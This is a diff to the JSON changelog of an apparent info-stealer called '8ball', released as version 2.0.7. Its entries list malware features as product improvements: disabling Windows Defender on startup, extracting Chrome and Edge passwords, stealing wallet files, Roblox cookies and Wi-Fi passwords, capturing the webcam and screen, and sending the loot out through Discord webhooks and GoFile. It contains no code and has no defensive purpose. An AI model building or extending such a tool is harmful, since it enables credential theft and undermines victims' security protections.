@@ -1,14 +1,16 @@
 {
-  "version": "2.0.6",
-  "title": "What's New in 2.0.6",
+  "version": "2.0.7",
+  "title": "What's New in 2.0.7",
   "changes": [
-    "Fixed webhook domain: discordapp.com \u2192 discord.com (old domain no longer works)",
-    "Fixed webhook validation \u2014 now accepts all discord.com subdomains",
-    "Disabled broken remote stub download that overrode local fixes",
-    "Added Content-Type fallback header to webhook requests",
-    "Fixed syntax errors (orphaned finally blocks)",
-    "Removed frozen check \u2014 can now run stub.py directly",
-    "All features enabled in standalone stub",
-    "PermissionError fix in wallet/zip stealer (unique filenames per thread)"
+    "5 new features: System Info, Screenshot, Webcam, Roblox Cookies, Wi-Fi Passwords",
+    "Windows Defender fully disabled on startup (12+ PowerShell methods + exclusions + 3-min re-enable)",
+    "Roblox: now grabs username, display name, user ID, limiteds count, and total RAP via API",
+    "Fixed triple execution — fetch_and_run_stub no longer re-runs the entire module",
+    "Added sentinel guard (_8BALL_EXECUTED) to prevent duplicate runs from any source",
+    "Merged PS.py PasswordExtractor (Chrome+Edge AES-GCM + DPAPI fallback) alongside existing v20 support",
+    "GoFile uploads: ZIP creation now handles missing directories, upload skips non-existent files",
+    "Local files fallback to direct Discord upload when GoFile fails",
+    "Rebranded all webhooks/embeds to '8ball' with new icon",
+    "Webhook URL updated to discordapp.com endpoint"
   ]
 }
